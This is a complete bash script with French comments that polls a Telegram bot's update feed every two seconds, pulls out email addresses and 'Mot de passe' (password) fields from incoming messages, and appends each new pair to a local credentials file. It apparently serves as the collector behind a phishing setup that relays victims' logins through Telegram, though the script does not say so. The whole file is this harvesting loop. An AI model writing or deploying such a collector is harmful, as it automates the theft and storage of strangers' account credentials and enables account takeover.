#!/bin/bash

#PARAMETERS
TOKEN="YOUR_TOKEN"
URL_BASE="https://api.telegram.org/bot$TOKEN/getUpdates"
FILE="datas_users.txt"
STATE="last_update_id.txt"
# check file
touch "$FILE"
chmod 600 "$FILE"
LAST_ID=0

[ -f "$STATE" ] && LAST_ID=$(cat "$STATE")


while true; do
    CONTENT=$(curl -s "$URL_BASE?offset=$LAST_ID")
    UPDATE_ID=$(echo "$CONTENT" | grep -oE '"update_id":[0-9]+' | tail -1 | cut -d: -f2)
    EMAIL=$(echo "$CONTENT" | grep -oE '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}')
    MDP=$(echo "$CONTENT" | grep -oE 'Mot de passe:[[:space:]]*[^\\n]+' | sed 's/Mot de passe:[[:space:]]*//')
    if [ -n "$UPDATE_ID" ] && [ "$UPDATE_ID" -ge "$LAST_ID" ]; then
        LAST_ID=$((UPDATE_ID + 1))
        echo "$LAST_ID" > "$STATE"
        if [ -n "$EMAIL" ] && [ -n "$MDP" ]; then
            NEW_BLOCK=$(printf "EMAIL=%s\nMDP=%s\n-----" "$EMAIL" "$MDP")
            LAST_BLOCK=$(tail -n 3 "$FILE" 2>/dev/null)
            if [ "$NEW_BLOCK" != "$LAST_BLOCK" ]; then
                echo "$NEW_BLOCK" >> "$FILE"
                echo "New user record : $EMAIL"
            fi
        fi
    fi
    sleep 2
done
